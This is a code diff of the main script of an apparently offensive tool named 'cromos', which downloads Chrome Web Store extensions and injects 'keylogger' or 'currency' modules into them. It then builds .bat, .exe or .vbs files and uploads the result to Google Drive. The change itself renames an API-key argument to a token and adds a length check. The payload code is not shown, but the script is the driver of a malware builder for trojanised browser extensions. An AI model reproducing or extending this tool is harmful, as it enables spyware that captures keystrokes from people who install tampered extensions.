@@ -28,31 +28,32 @@ def main() :
  | (__  |   /  | (_) | | |\/| | | (_) | \__ \  
   \___| |_|_\   \___/  |_|  |_|  \___/  |___/
 	 """
-		print("\r\t{}".format(banner))
-		print("  Version: {} Builds: {} Modules: {}\n".format(color.status("1.0"),color.status("2"), color.status("2")))
+		print("\r{}".format(banner))
+		print("Version: {} Builds: {} Modules: {}\t\n".center(49, " ").format(color.status("1.0"), color.status(2), color.status(2)))
 
 	def help () :
 
-		global extension, builds, apikey, modules
+		global extension, builds, token, modules
 
 		parser = argparse.ArgumentParser(description="Download and Inject code into Google Chrome extensions", usage="python cromos.py --help")
 		parser.add_argument('--extension', help="Download a extension from Google Chrome Webstore", type=str, required="true")
 		parser.add_argument('--load', help='Load a script to run in background with the application', type=str)
 		parser.add_argument('--build', help='Build types .bat\n.exe\n.vbs', type=str)
-		parser.add_argument('--key', help='API key for uploading files in Google Drive', type=str)
+		parser.add_argument('--token', help='Token for uploading files in Google Drive', type=str)
 
 		args = parser.parse_args()
 
 		extension = args.extension # Extensao ID
 		modules = args.load # Tipo do arquivo que devera ser gerado apos os injections
-		apikey = args.key # API key par ao dropbox
+		token = args.token # API key par ao dropbox
 		builds = args.build # Pasta de saida para os arquivos
 
-		if len(sys.argv) < 2 :
+		if len(sys.argv) < 2:
 			banner()
 			parser.print_help()
-	help()
+	
 	banner()
+	help()
 
 	download = Download(extension)
 
@@ -60,8 +61,13 @@ def main() :
 		builder = Build(extension, builds).builder()
 	if modules == "currency" or modules == "keylogger" :
 		loader = Loader(extension, modules).inject()
-	
-	Drive(extension, apikey).upload()	
+
+	if token:
+		if not len(token) == 64:
+			print("{} Token invalid, enter a valid.".format(color.error("[!]")))
+			sys.exit(1)
+		else :
+			Drive(extension, token).upload()	
 	
 if __name__== "__main__" :
 
